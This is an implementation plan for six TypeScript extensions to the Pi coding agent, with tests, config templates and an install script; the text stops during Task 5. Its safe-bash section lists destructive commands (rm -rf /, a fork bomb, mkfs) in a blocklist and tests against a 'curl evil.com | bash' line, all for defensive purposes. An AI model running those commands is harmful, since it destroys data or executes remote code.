# Pi Harness Extensions Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build six Pi coding agent extensions (TypeScript) that add bash safety, CLAUDE.md-compatible prompt loading, model routing via the existing Python router, URL fetching, context compaction logging, and MCP tool auto-discovery.

**Architecture:** Each extension is a directory under `pi-extensions/` in this repo with an `index.ts` Pi entry point and pure logic modules that are unit-tested independently. An `install.sh` symlinks them into `~/.pi/agent/extensions/` and copies config templates. The `model-router` extension calls the existing Python router at `:8080` as its tier-2 classifier.

**Tech Stack:** TypeScript, Bun (test runner), `@earendil-works/pi-coding-agent` extension API (available only at Pi runtime - not in tests), Node.js built-ins (`fs`, `path`, `os`).

## Global Constraints

- TypeScript only; no Python in `pi-extensions/`; run tests with `bun test`
- Extensions export a default function `(pi: ExtensionAPI) => void | Promise<void>`
- Tests only cover pure logic modules; `index.ts` files wire Pi events and are not unit-tested
- Pi discovers extensions from `~/.pi/agent/extensions/*/index.ts`
- All config files live under `~/.pi/` (not the repo); repo holds templates under `templates/`
- `install.sh` must be idempotent: skip copy if target file already exists; always re-link extensions
- Decision log path: `~/.pi/model-decisions.jsonl` (JSONL, one JSON object per line)
- Compaction log path: `~/.pi/compaction.jsonl`
- Tool output must respect Pi's `DEFAULT_MAX_BYTES` / `DEFAULT_MAX_LINES` truncation constants
- All git commands: `cd <path> && git <cmd>` — never `git -C`

---

## File Map

```text
pi-extensions/
  package.json                    # bun test config + TypeScript dev deps
  tsconfig.json                   # TypeScript settings
  safe-bash/
    rules.ts                      # pure: glob pattern matching
    rules.test.ts
    index.ts                      # Pi extension entry
  claude-compat/
    loader.ts                     # pure: reads ~/.pi/PI.md + .pi/PI.md
    loader.test.ts
    index.ts
  model-router/
    rules.ts                      # pure: keyword/token rule matching
    rules.test.ts
    classifier.ts                 # pure: HTTP call to Python router
    classifier.test.ts
    logger.ts                     # pure: JSONL append for decisions
    logger.test.ts
    index.ts
  fetch-url/
    fetcher.ts                    # pure: URL validation + fetch + HTML strip
    fetcher.test.ts
    index.ts
  context-manager/
    logger.ts                     # pure: JSONL append for compaction events
    logger.test.ts
    index.ts
  mcp-integration/
    config.ts                     # pure: load ~/.pi/mcp.json
    config.test.ts
    discovery.ts                  # pure: HTTP GET /tools from MCP server
    discovery.test.ts
    index.ts
templates/
  settings.json                   # template for ~/.pi/agent/settings.json
  model-rules.json                # template for ~/.pi/model-rules.json
  PI.md                           # template for ~/.pi/PI.md
  mcp.json                        # template for ~/.pi/mcp.json
install.sh                        # symlinks extensions, copies templates
```

---

### Task 1: Repo scaffolding, config templates, install script

**Files:**

- Create: `pi-extensions/package.json`
- Create: `pi-extensions/tsconfig.json`
- Create: `templates/settings.json`
- Create: `templates/model-rules.json`
- Create: `templates/PI.md`
- Create: `templates/mcp.json`
- Create: `install.sh`

**Interfaces:**

- Produces: `bun test` runner usable by all subsequent tasks; `install.sh` usable after any task

- [ ] **Step 1: Create `pi-extensions/package.json`**

```json
{
  "name": "pi-extensions",
  "type": "module",
  "scripts": {
    "test": "bun test"
  },
  "devDependencies": {
    "typescript": "^5.4.0",
    "@types/node": "^20.0.0",
    "bun-types": "latest"
  }
}
```

- [ ] **Step 2: Create `pi-extensions/tsconfig.json`**

```json
{
  "compilerOptions": {
    "target": "ESNext",
    "module": "ESNext",
    "moduleResolution": "bundler",
    "strict": true,
    "noEmit": true,
    "types": ["bun-types"]
  },
  "include": ["**/*.ts"]
}
```

- [ ] **Step 3: Create `templates/settings.json`**

```json
{
  "defaultProvider": "anthropic",
  "defaultModel": "claude-sonnet-4-20250514",
  "defaultThinkingLevel": "medium",
  "compaction": {
    "enabled": true,
    "reserveTokens": 16384,
    "keepRecentTokens": 20000
  },
  "bashSafety": {
    "blocklist": [
      "rm -rf /",
      "rm -rf ~",
      "chmod -R 777 *",
      ":(){ :|:& };:",
      "dd if=/dev/zero*",
      "mkfs*"
    ],
    "allowlist": [
      "git add *",
      "bun *",
      "npm *",
      "npx *",
      "ls *",
      "cat *",
      "grep *",
      "find *",
      "echo *"
    ],
    "requireConfirmForUnknown": true
  }
}
```

- [ ] **Step 4: Create `templates/model-rules.json`**

```json
{
  "rules": [
    { "if": { "tokenCount": { "lt": 300 } }, "then": "local" },
    { "if": { "keywords": ["ls", "grep", "cat", "echo", "pwd", "which"] }, "then": "local" },
    { "if": { "keywords": ["analyze", "refactor", "architecture", "design", "review all"] }, "then": "heavy" },
    { "if": { "tokenCount": { "gt": 8000 } }, "then": "heavy" }
  ],
  "classifierUrl": "http://localhost:8080",
  "classifierTimeoutMs": 2000,
  "defaultModel": "claude-sonnet-4-20250514",
  "models": {
    "local": "qwen3:4b",
    "medium": "claude-sonnet-4-20250514",
    "heavy": "claude-opus-4-8-20251101"
  }
}
```

- [ ] **Step 5: Create `templates/PI.md`**

```markdown
# Global Pi Instructions

## Git

- Always use SSH URLs for `git clone`: `git@github.com:<owner>/<repo>.git`
- Use `cd <path> && git <cmd>`, never `git -C <path> <cmd>`

## Code Style

- No unnecessary comments. Only add one when the WHY is non-obvious.
- Prefer editing existing files over creating new ones.
- No error handling for scenarios that cannot happen.
```

- [ ] **Step 6: Create `templates/mcp.json`**

```json
{
  "servers": []
}
```

- [ ] **Step 7: Create `install.sh`**

```bash
#!/usr/bin/env bash
set -euo pipefail

REPO_DIR="$(cd "$(dirname "$0")" && pwd)"
PI_EXT_DIR="$HOME/.pi/agent/extensions"
PI_DIR="$HOME/.pi"
PI_AGENT_DIR="$HOME/.pi/agent"

mkdir -p "$PI_EXT_DIR"
mkdir -p "$PI_AGENT_DIR"

echo "==> Linking extensions..."
for ext_dir in "$REPO_DIR/pi-extensions"/*/; do
  name=$(basename "$ext_dir")
  target="$PI_EXT_DIR/$name"
  # Remove existing symlink; leave real directories alone
  if [ -L "$target" ]; then
    rm "$target"
  fi
  ln -s "$ext_dir" "$target"
  echo "  Linked: $name -> $target"
done

echo "==> Copying templates..."
for template in "$REPO_DIR/templates"/*; do
  name=$(basename "$template")
  case "$name" in
    settings.json)
      target="$PI_AGENT_DIR/settings.json"
      ;;
    *)
      target="$PI_DIR/$name"
      ;;
  esac
  if [ -f "$target" ]; then
    echo "  Skipped (exists): $target"
  else
    cp "$template" "$target"
    echo "  Created: $target"
  fi
done

echo "==> Done. Run: pi"
```

- [ ] **Step 8: Make install.sh executable**

```bash
chmod +x install.sh
```

- [ ] **Step 9: Install bun dependencies**

```bash
cd pi-extensions && bun install
```

Expected: `bun install` downloads `typescript`, `@types/node`, `bun-types` into `pi-extensions/node_modules/`.

- [ ] **Step 10: Commit**

```bash
git add pi-extensions/package.json pi-extensions/tsconfig.json templates/ install.sh
git commit -m "chore: add pi-extensions scaffold, templates, and install script"
```

---

### Task 2: `safe-bash` extension

**Files:**

- Create: `pi-extensions/safe-bash/rules.ts`
- Create: `pi-extensions/safe-bash/rules.test.ts`
- Create: `pi-extensions/safe-bash/index.ts`

**Interfaces:**

- Consumes: `templates/settings.json` shape (field `bashSafety.blocklist`, `bashSafety.allowlist`, `bashSafety.requireConfirmForUnknown`)
- Produces: `matchesPattern(command, pattern): boolean`, `matchesAny(command, patterns): boolean` used by `index.ts`

- [ ] **Step 1: Write `rules.ts`**

```typescript
// pi-extensions/safe-bash/rules.ts

/**
 * Match a shell command string against a glob pattern.
 * Only `*` is treated as wildcard (matches any sequence of chars).
 * Match is tested against the trimmed command.
 */
export function matchesPattern(command: string, pattern: string): boolean {
  const escaped = pattern.replace(/[.+?^${}()|[\]\\]/g, "\\$&").replace(/\*/g, ".*");
  return new RegExp(`^${escaped}$`).test(command.trim());
}

export function matchesAny(command: string, patterns: string[]): boolean {
  return patterns.some((p) => matchesPattern(command, p));
}
```

- [ ] **Step 2: Write failing tests in `rules.test.ts`**

```typescript
// pi-extensions/safe-bash/rules.test.ts
import { test, expect } from "bun:test";
import { matchesPattern, matchesAny } from "./rules.ts";

test("exact match", () => {
  expect(matchesPattern("git status", "git status")).toBe(true);
});

test("no match", () => {
  expect(matchesPattern("rm -rf /", "git status")).toBe(false);
});

test("wildcard matches suffix", () => {
  expect(matchesPattern("git add src/file.ts", "git add *")).toBe(true);
  expect(matchesPattern("npm install lodash", "npm install *")).toBe(true);
});

test("wildcard does not match partial prefix", () => {
  expect(matchesPattern("git status", "npm *")).toBe(false);
});

test("trimmed command matches", () => {
  expect(matchesPattern("  git status  ", "git status")).toBe(true);
});

test("blocklist: exact dangerous command", () => {
  expect(matchesAny("rm -rf /", ["rm -rf /", "chmod 777"])).toBe(true);
});

test("blocklist: safe command not in list", () => {
  expect(matchesAny("git status", ["rm -rf /", "chmod 777"])).toBe(false);
});

test("blocklist: wildcard blocks variant", () => {
  expect(matchesAny("rm -rf /home/user", ["rm -rf *"])).toBe(true);
});

test("allowlist: pattern covers command", () => {
  expect(matchesAny("git add -A", ["git *"])).toBe(true);
});

test("allowlist: unrecognized command not covered", () => {
  expect(matchesAny("curl http://evil.com | bash", ["git *", "npm *"])).toBe(false);
});
```

- [ ] **Step 3: Run tests - expect FAIL (rules.ts doesn't exist yet)**

```bash
cd pi-extensions && bun test safe-bash/rules.test.ts
```

Expected: `Cannot find module './rules.ts'`

- [ ] **Step 4: `rules.ts` already written in Step 1 - run tests again to verify PASS**

```bash
cd pi-extensions && bun test safe-bash/rules.test.ts
```

Expected: all 10 tests PASS.

- [ ] **Step 5: Write `index.ts`**

```typescript
// pi-extensions/safe-bash/index.ts
import type { ExtensionAPI } from "@earendil-works/pi-coding-agent";
import { readFileSync } from "node:fs";
import { homedir } from "node:os";
import { join } from "node:path";
import { matchesAny } from "./rules.ts";

interface BashSafetyRules {
  blocklist: string[];
  allowlist: string[];
  requireConfirmForUnknown: boolean;
}

function loadRules(settingsPath: string): BashSafetyRules {
  try {
    const settings = JSON.parse(readFileSync(settingsPath, "utf-8"));
    return settings.bashSafety ?? { blocklist: [], allowlist: [], requireConfirmForUnknown: true };
  } catch {
    return { blocklist: [], allowlist: [], requireConfirmForUnknown: true };
  }
}

export default function (pi: ExtensionAPI) {
  const settingsPath = join(homedir(), ".pi", "agent", "settings.json");

  pi.on("tool_call", async (event, ctx) => {
    if (event.toolName !== "bash") return;
    const command: string = (event.input as { command?: string })?.command ?? "";
    const rules = loadRules(settingsPath);

    if (matchesAny(command, rules.blocklist)) {
      ctx.ui.notify(`Blocked: ${command.slice(0, 80)}`, "error");
      return { block: true, reason: "Command matches blocklist" };
    }

    if (matchesAny(command, rules.allowlist)) {
      return; // pre-approved
    }

    if (rules.requireConfirmForUnknown) {
      const ok = await ctx.ui.confirm(
        "Bash approval required",
        `Allow command:\n\n${command.slice(0, 300)}`
      );
      if (!ok) return { block: true, reason: "User denied" };
    }
  });
}
```

- [ ] **Step 6: Commit**

```bash
cd /Users/tillhoffmann/code/thetillhoff/ai-router && git add pi-extensions/safe-bash/
git commit -m "feat(pi): safe-bash extension with blocklist/allowlist pattern matching"
```

---

### Task 3: `claude-compat` extension

**Files:**

- Create: `pi-extensions/claude-compat/loader.ts`
- Create: `pi-extensions/claude-compat/loader.test.ts`
- Create: `pi-extensions/claude-compat/index.ts`

**Interfaces:**

- Produces: `loadPIMd(cwd: string, globalDir?: string): string`
  - Returns empty string when neither file exists
  - Returns single file content when only one exists
  - Joins both with `\n\n---\n\n` when both exist (global first, local second)

- [ ] **Step 1: Write failing tests in `loader.test.ts`**

```typescript
// pi-extensions/claude-compat/loader.test.ts
import { test, expect, beforeEach, afterEach } from "bun:test";
import { mkdtempSync, writeFileSync, mkdirSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { loadPIMd } from "./loader.ts";

let tmpDirs: string[] = [];
function makeTmp(): string {
  const d = mkdtempSync(join(tmpdir(), "pi-compat-"));
  tmpDirs.push(d);
  return d;
}

afterEach(() => {
  for (const d of tmpDirs) rmSync(d, { recursive: true, force: true });
  tmpDirs = [];
});

test("returns empty string when no PI.md files exist", () => {
  expect(loadPIMd("/nonexistent", "/also/nonexistent")).toBe("");
});

test("loads global PI.md only", () => {
  const globalDir = makeTmp();
  writeFileSync(join(globalDir, "PI.md"), "Global instructions");
  expect(loadPIMd("/nonexistent/project", globalDir)).toBe("Global instructions");
});

test("loads local PI.md only", () => {
  const localDir = makeTmp();
  mkdirSync(join(localDir, ".pi"));
  writeFileSync(join(localDir, ".pi", "PI.md"), "Local instructions");
  expect(loadPIMd(localDir, "/nonexistent/global")).toBe("Local instructions");
});

test("joins both with separator, global first", () => {
  const globalDir = makeTmp();
  const localDir = makeTmp();
  writeFileSync(join(globalDir, "PI.md"), "Global");
  mkdirSync(join(localDir, ".pi"));
  writeFileSync(join(localDir, ".pi", "PI.md"), "Local");
  expect(loadPIMd(localDir, globalDir)).toBe("Global\n\n---\n\nLocal");
});

test("trims whitespace from file content", () => {
  const globalDir = makeTmp();
  writeFileSync(join(globalDir, "PI.md"), "  Global  \n\n");
  expect(loadPIMd("/nonexistent", globalDir)).toBe("Global");
});
```

- [ ] **Step 2: Run tests - expect FAIL**

```bash
cd pi-extensions && bun test claude-compat/loader.test.ts
```

Expected: `Cannot find module './loader.ts'`

- [ ] **Step 3: Write `loader.ts`**

```typescript
// pi-extensions/claude-compat/loader.ts
import { existsSync, readFileSync } from "node:fs";
import { homedir } from "node:os";
import { join } from "node:path";

export function loadPIMd(cwd: string, globalDir?: string): string {
  const parts: string[] = [];
  const home = globalDir ?? join(homedir(), ".pi");

  const globalPath = join(home, "PI.md");
  if (existsSync(globalPath)) {
    parts.push(readFileSync(globalPath, "utf-8").trim());
  }

  const localPath = join(cwd, ".pi", "PI.md");
  if (existsSync(localPath)) {
    parts.push(readFileSync(localPath, "utf-8").trim());
  }

  return parts.join("\n\n---\n\n");
}
```

- [ ] **Step 4: Run tests - expect PASS**

```bash
cd pi-extensions && bun test claude-compat/loader.test.ts
```

Expected: all 5 tests PASS.

- [ ] **Step 5: Write `index.ts`**

```typescript
// pi-extensions/claude-compat/index.ts
import type { ExtensionAPI } from "@earendil-works/pi-coding-agent";
import { homedir } from "node:os";
import { join } from "node:path";
import { loadPIMd } from "./loader.ts";

export default function (pi: ExtensionAPI) {
  const globalDir = join(homedir(), ".pi");

  pi.on("before_agent_start", async (event, ctx) => {
    const content = loadPIMd(ctx.cwd, globalDir);
    if (content) {
      // event.systemPrompt is mutable; append PI.md content
      (event as unknown as { systemPrompt: string }).systemPrompt =
        ((event as unknown as { systemPrompt?: string }).systemPrompt ?? "") +
        "\n\n" +
        content;
    }
  });
}
```

- [ ] **Step 6: Commit**

```bash
cd /Users/tillhoffmann/code/thetillhoff/ai-router && git add pi-extensions/claude-compat/
git commit -m "feat(pi): claude-compat extension loads PI.md into system prompt"
```

---

### Task 4: `model-router` extension

**Files:**

- Create: `pi-extensions/model-router/rules.ts`
- Create: `pi-extensions/model-router/rules.test.ts`
- Create: `pi-extensions/model-router/classifier.ts`
- Create: `pi-extensions/model-router/classifier.test.ts`
- Create: `pi-extensions/model-router/logger.ts`
- Create: `pi-extensions/model-router/logger.test.ts`
- Create: `pi-extensions/model-router/index.ts`

**Interfaces:**

- Consumes: Python router at `config.classifierUrl/v1/chat/completions`; responds with `X-Router-Tier` header
- Produces:
  - `applyRules(lastMessage, tokenCount, rules): string | null` - tier name or null
  - `estimateTokens(messages): number`
  - `callClassifier(baseUrl, messages, timeoutMs): Promise<string | null>` - tier name or null
  - `appendDecision(logPath, entry: RouterDecision): void`

- [ ] **Step 1: Write `rules.ts`**

```typescript
// pi-extensions/model-router/rules.ts

export interface RoutingRule {
  if: {
    keywords?: string[];
    tokenCount?: { lt?: number; gt?: number };
  };
  then: string; // tier name
}

export function estimateTokens(messages: Array<{ content?: string }>): number {
  const text = messages.map((m) => m.content ?? "").join(" ");
  return Math.ceil(text.length / 4); // ~4 chars per token
}

/**
 * Returns the first matching tier name, or null if no rule matches.
 * Rules are checked in order; first match wins.
 */
export function applyRules(
  lastMessage: string,
  tokenCount: number,
  rules: RoutingRule[]
): string | null {
  const lower = lastMessage.toLowerCase();
  for (const rule of rules) {
    const { if: cond } = rule;

    if (cond.keywords && cond.keywords.some((k) => lower.includes(k.toLowerCase()))) {
      return rule.then;
    }

    if (cond.tokenCount) {
      const { lt, gt } = cond.tokenCount;
      if (lt !== undefined && tokenCount < lt) return rule.then;
      if (gt !== undefined && tokenCount > gt) return rule.then;
    }
  }
  return null;
}
```

- [ ] **Step 2: Write failing tests in `rules.test.ts`**

```typescript
// pi-extensions/model-router/rules.test.ts
import { test, expect } from "bun:test";
import { applyRules, estimateTokens } from "./rules.ts";

const rules = [
  { if: { tokenCount: { lt: 300 } }, then: "local" },
  { if: { keywords: ["ls", "grep", "cat"] }, then: "local" },
  { if: { keywords: ["analyze", "architecture"] }, then: "heavy" },
  { if: { tokenCount: { gt: 8000 } }, then: "heavy" },
];

test("no rule matches returns null", () => {
  expect(applyRules("write a function", 1000, rules)).toBeNull();
});

test("short message matches token lt rule", () => {
  expect(applyRules("hi", 50, rules)).toBe("local");
});

test("keyword match for local", () => {
  expect(applyRules("grep for errors in log", 1000, rules)).toBe("local");
});

test("keyword match is case-insensitive", () => {
  expect(applyRules("ANALYZE this codebase", 1000, rules)).toBe("heavy");
});

test("large token count matches gt rule", () => {
  expect(applyRules("refactor something", 9000, rules)).toBe("heavy");
});

test("first matching rule wins (keyword before token gt)", () => {
  // message has local keyword AND high token count; local keyword rule comes first
  expect(applyRules("grep for something", 9000, rules)).toBe("local");
});

test("estimateTokens: 4 chars per token", () => {
  expect(estimateTokens([{ content: "a".repeat(400) }])).toBe(100);
});

test("estimateTokens: joins messages", () => {
  expect(estimateTokens([{ content: "aaaa" }, { content: "aaaa" }])).toBe(2);
});
```

- [ ] **Step 3: Run tests - expect FAIL**

```bash
cd pi-extensions && bun test model-router/rules.test.ts
```

Expected: `Cannot find module './rules.ts'`

- [ ] **Step 4: Run tests after writing rules.ts - expect PASS**

```bash
cd pi-extensions && bun test model-router/rules.test.ts
```

Expected: all 8 tests PASS.

- [ ] **Step 5: Write `classifier.ts`**

```typescript
// pi-extensions/model-router/classifier.ts

/**
 * POST to the Python router's /v1/chat/completions with model:"auto".
 * The router classifies and returns X-Router-Tier header.
 * Returns null on timeout, network error, or missing header.
 */
export async function callClassifier(
  baseUrl: string,
  messages: Array<{ role: string; content?: string }>,
  timeoutMs: number
): Promise<string | null> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const response = await fetch(`${baseUrl}/v1/chat/completions`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ model: "auto", messages }),
      signal: controller.signal,
    });
    clearTimeout(timer);
    return response.headers.get("x-router-tier") ?? null;
  } catch {
    clearTimeout(timer);
    return null;
  }
}
```

- [ ] **Step 6: Write failing tests in `classifier.test.ts`**

```typescript
// pi-extensions/model-router/classifier.test.ts
import { test, expect, mock, afterEach } from "bun:test";
import { callClassifier } from "./classifier.ts";

const originalFetch = globalThis.fetch;
afterEach(() => { globalThis.fetch = originalFetch; });

test("returns tier from X-Router-Tier header", async () => {
  globalThis.fetch = mock(() =>
    Promise.resolve(
      new Response(JSON.stringify({}), {
        headers: { "x-router-tier": "heavy" },
      })
    )
  );
  const tier = await callClassifier("http://localhost:8080", [{ role: "user", content: "hi" }], 2000);
  expect(tier).toBe("heavy");
});

test("returns null when header missing", async () => {
  globalThis.fetch = mock(() =>
    Promise.resolve(new Response(JSON.stringify({})))
  );
  const tier = await callClassifier("http://localhost:8080", [{ role: "user", content: "hi" }], 2000);
  expect(tier).toBeNull();
});

test("returns null on network error", async () => {
  globalThis.fetch = mock(() => Promise.reject(new Error("ECONNREFUSED")));
  const tier = await callClassifier("http://localhost:8080", [], 2000);
  expect(tier).toBeNull();
});

test("returns null on abort (timeout)", async () => {
  globalThis.fetch = mock(
    () => new Promise((_, reject) => setTimeout(() => reject(new DOMException("aborted", "AbortError")), 50))
  );
  const tier = await callClassifier("http://localhost:8080", [], 10);
  expect(tier).toBeNull();
});
```

- [ ] **Step 7: Run classifier tests - expect PASS**

```bash
cd pi-extensions && bun test model-router/classifier.test.ts
```

Expected: all 4 tests PASS.

- [ ] **Step 8: Write `logger.ts`**

```typescript
// pi-extensions/model-router/logger.ts
import { appendFileSync, mkdirSync } from "node:fs";
import { dirname } from "node:path";

export interface RouterDecision {
  ts: string;
  session: string;
  tier: string;
  model: string;
  reason: "rule" | "classifier" | "default";
  rule?: string;
  latencyMs: number;
}

export function appendDecision(logPath: string, entry: RouterDecision): void {
  mkdirSync(dirname(logPath), { recursive: true });
  appendFileSync(logPath, JSON.stringify(entry) + "\n", "utf-8");
}
```

- [ ] **Step 9: Write failing tests in `logger.test.ts`**

```typescript
// pi-extensions/model-router/logger.test.ts
import { test, expect, afterEach } from "bun:test";
import { mkdtempSync, readFileSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { appendDecision } from "./logger.ts";

let tmpDirs: string[] = [];
afterEach(() => {
  for (const d of tmpDirs) rmSync(d, { recursive: true, force: true });
  tmpDirs = [];
});

test("writes valid JSONL line", () => {
  const dir = mkdtempSync(join(tmpdir(), "pi-log-"));
  tmpDirs.push(dir);
  const logPath = join(dir, "model-decisions.jsonl");
  const entry = { ts: "2026-01-01T00:00:00Z", session: "main", tier: "local", model: "qwen3:4b", reason: "rule" as const, latencyMs: 5 };
  appendDecision(logPath, entry);
  const line = readFileSync(logPath, "utf-8").trim();
  expect(JSON.parse(line)).toMatchObject(entry);
});

test("appends multiple lines", () => {
  const dir = mkdtempSync(join(tmpdir(), "pi-log-"));
  tmpDirs.push(dir);
  const logPath = join(dir, "decisions.jsonl");
  appendDecision(logPath, { ts: "t1", session: "s", tier: "local", model: "m", reason: "rule", latencyMs: 1 });
  appendDecision(logPath, { ts: "t2", session: "s", tier: "heavy", model: "m2", reason: "classifier", latencyMs: 200 });
  const lines = readFileSync(logPath, "utf-8").trim().split("\n");
  expect(lines).toHaveLength(2);
  expect(JSON.parse(lines[1]).tier).toBe("heavy");
});

test("creates parent directories", () => {
  const dir = mkdtempSync(join(tmpdir(), "pi-log-"));
  tmpDirs.push(dir);
  const logPath = join(dir, "nested", "deep", "log.jsonl");
  appendDecision(logPath, { ts: "t", session: "s", tier: "local", model: "m", reason: "default", latencyMs: 0 });
  const line = readFileSync(logPath, "utf-8").trim();
  expect(JSON.parse(line).tier).toBe("local");
});
```

- [ ] **Step 10: Run logger tests - expect PASS**

```bash
cd pi-extensions && bun test model-router/logger.test.ts
```

Expected: all 3 tests PASS.

- [ ] **Step 11: Write `index.ts`**

```typescript
// pi-extensions/model-router/index.ts
import type { ExtensionAPI } from "@earendil-works/pi-coding-agent";
import { existsSync, readFileSync } from "node:fs";
import { homedir } from "node:os";
import { join } from "node:path";
import { applyRules, estimateTokens, type RoutingRule } from "./rules.ts";
import { callClassifier } from "./classifier.ts";
import { appendDecision } from "./logger.ts";

interface RouterConfig {
  rules: RoutingRule[];
  classifierUrl: string | null;
  classifierTimeoutMs: number;
  defaultModel: string | null;
  models: Record<string, string>;
}

function loadConfig(rulesPath: string): RouterConfig {
  if (!existsSync(rulesPath)) {
    return { rules: [], classifierUrl: null, classifierTimeoutMs: 2000, defaultModel: null, models: {} };
  }
  try {
    return JSON.parse(readFileSync(rulesPath, "utf-8")) as RouterConfig;
  } catch {
    return { rules: [], classifierUrl: null, classifierTimeoutMs: 2000, defaultModel: null, models: {} };
  }
}

export default function (pi: ExtensionAPI) {
  const rulesPath = join(homedir(), ".pi", "model-rules.json");
  const logPath = join(homedir(), ".pi", "model-decisions.jsonl");

  pi.on("before_agent_start", async (event, ctx) => {
    const config = loadConfig(rulesPath);
    const rawEvent = event as unknown as { messages?: Array<{ role: string; content?: string }> };
    const messages = rawEvent.messages ?? [];
    const lastMessage = [...messages].reverse().find((m) => m.role === "user")?.content ?? "";
    const tokenCount = estimateTokens(messages);
    const start = Date.now();

    const session = ctx.sessionManager.getBranch() ?? "unknown";

    async function setModelByName(modelName: string): Promise<void> {
      const model = ctx.modelRegistry.find(undefined as unknown as string, modelName);
      if (model) await pi.setModel(model);
    }

    // Tier 1: rule-based fast path
    const ruleTier = applyRules(lastMessage, tokenCount, config.rules ?? []);
    if (ruleTier) {
      const modelName = config.models?.[ruleTier] ?? config.defaultModel;
      if (modelName) await setModelByName(modelName);
      appendDecision(logPath, {
        ts: new Date().toISOString(),
        session,
        tier: ruleTier,
        model: modelName ?? "unknown",
        reason: "rule",
        rule: ruleTier,
        latencyMs: Date.now() - start,
      });
      return;
    }

    // Tier 2: classifier (Python router)
    if (config.classifierUrl) {
      const tier = await callClassifier(config.classifierUrl, messages, config.classifierTimeoutMs ?? 2000);
      if (tier) {
        const modelName = config.models?.[tier] ?? config.defaultModel;
        if (modelName) await setModelByName(modelName);
        appendDecision(logPath, {
          ts: new Date().toISOString(),
          session,
          tier,
          model: modelName ?? "unknown",
          reason: "classifier",
          latencyMs: Date.now() - start,
        });
        return;
      }
    }

    // Tier 3: default — no model change; Pi uses whatever is configured
    appendDecision(logPath, {
      ts: new Date().toISOString(),
      session,
      tier: "default",
      model: config.defaultModel ?? (ctx.model as { id?: string } | null)?.id ?? "unknown",
      reason: "default",
      latencyMs: Date.now() - start,
    });
  });
}
```

- [ ] **Step 12: Commit**

```bash
cd /Users/tillhoffmann/code/thetillhoff/ai-router && git add pi-extensions/model-router/
git commit -m "feat(pi): model-router extension with rule/classifier/default ladder"
```

---

### Task 5: `fetch-url` extension

**Files:**

- Create: `pi-extensions/fetch-url/fetcher.ts`
- Create: `pi-extensions/fetch-url/fetcher.test.ts`
- Create: `pi-extensions/fetch-url/index.ts`

**Interfaces:**

- Produces:
  - `validateUrl(url: string): void` - throws `Error` if URL is not valid HTTPS
  - `fetchText(url: string): Promise<string>` - returns text; strips HTML tags for `text/html` responses

- [ ] **Step 1: Write failing tests in `fetcher.test.ts`**

```typescript
// pi-extensions/fetch-url/fetcher.test.ts
import { test, expect, mock, afterEach } from "bun:test";
import { validateUrl, fetchText } from "./fetcher.ts";

const originalFetch = globalThis.fetch;
afterEach(() => { globalThis.fetch = originalFetch; });

// validateUrl
test("accepts https URL", () => {
  expect(() => validateUrl("https://example.com/path")).not.toThrow();
});

test("rejects http URL", () => {
  expect(() => validateUrl("http://example.com")).toThrow("Only HTTPS URLs allowed");
});

test("rejects non-URL string", () => {
  expect(() => validateUrl("not a url")).toThrow("Invalid URL");
});

test("rejects ftp URL", () => {
  expect(() => validateUrl("ftp://files.example.com")).toThrow("Only HTTPS URLs allowed");
});

// fetchText
test("returns plain text as-is", async () => {
  globalThis.fetch = mock(() =>
    Promise.resolve(
      new Response("hello world", {
        headers: { "content-type": "text/plain" },
      })
    )
  );
  expect(await fetchText("https://example.com")).toBe("hello world");
});

test("strips HTML tags for text/html", async () => {
  globalThis.fetch = mock(() =>
    Promise.resolve(
      new Response("<html><body><p>Hello world</p></body></html>", {
        headers: { "content-type": "text/html" },
      })
    )
  );
  const result = await fetchText("https://example.com");
  expect(result).not.toContain("<");
  expect(result).toContain("Hello world");
});

test("throws on HTTP error status", async () => {
  globalThis.fetch = mock(() =>
    Promise.resolve(new Response("Not Found", { status: 404 }))
  );
  await expect(fetchText("https://example.com")).rejects.toThrow("HTTP 404");
});

test("throws on non-HTTPS URL", async () => {
  await expect(fetchText("http://example.com")).rejects.toThrow("Only HTTPS URLs allowed");
});
```

- [ ] **Step 2: Run tests - expect FAIL**

```bash
cd pi-extensions && bun test fetch-url/fetcher.test.ts
```

Expected: `Cannot find module './fetcher.ts'`

- [ ] **Step 3: Write `fetcher.ts`**

```typescript
// pi-extensions/fetch-url/fetcher.ts

export function validateUrl(url: string): void {
  let parsed: URL;
  try {
    parsed = new URL(url);
  } catch {
    throw new Error(`Invalid URL: ${url}`);
  }
  if (parsed.protocol !== "https:") {
    throw new Error(`Only HTTPS URLs allowed, got: ${parsed.protocol}`);
  }
}

export async function fetchText(url: string): Promise<string> {
  validateUrl(url);
  const response = await fetch(url, {
    headers: { "User-Agent": "pi-fetch-url/1.0" },
  });
  if (!response.ok) {
    throw new Error(`HTTP ${response.status}: ${url}`);
  }
  const contentType = response.headers.get("content-type") ?? "";
  const text = await response.text();
  if (contentType.includes("text/html")) {
    return text.replace(/<[^>]+>/g, " ").replace(/\s+/g, " ").trim();
  }
  return text;
}
```

- [ ] **Step 4: Run tests - expect PASS**

```bash
cd pi-extensions && bun test fetch-url/fetcher.test.ts
```

Expected: all 7 tests PASS.

- [ ] **Step 5: Write `index.ts`**

```typescript
// pi-extensions/fetch-url/index.ts
import type { ExtensionAPI } from "@earendil-works/pi-coding-agent";
import { Type } from "typebox";
import { fetchText } from "./fetcher.ts";

const MAX_CHARS = 40_000; // ~10k tokens; truncate before handing to LLM

export default function (pi: ExtensionAPI) {
  pi.registerTool({
    name: "fetch_url",
    label: "Fetch URL",
    description:
      "Fetch the text content of an HTTPS URL. Returns plain text; strips HTML tags for web pages. Use for reading documentation, APIs, or any public HTTPS resource.",
    promptSnippet: "Use fetch_url to read any HTTPS web page or API response",
    parameters: Type.Object({
      url: Type.String({ description: "The HTTPS URL to fetch" }),
    }),
    async execute(_toolCallId, params, signal) {
      const text = await fetchText(params.url);
      const truncated = text.length > MAX_CHARS;
      const content = truncated ? text.slice(0, MAX_CHARS) + `\n[Truncated: ${text.length} chars total]` : text;
      return {
        content: [{ type: "text", text: content }],
        details: { url: params.url, totalChars: text.length, truncated },
      };
    },
  });
}
```

- [ ] **Step 6: Commit**

```bash
cd /Users/tillhoffmann/code/thetillhoff/ai-router && git add pi-extensions/fetch-url/
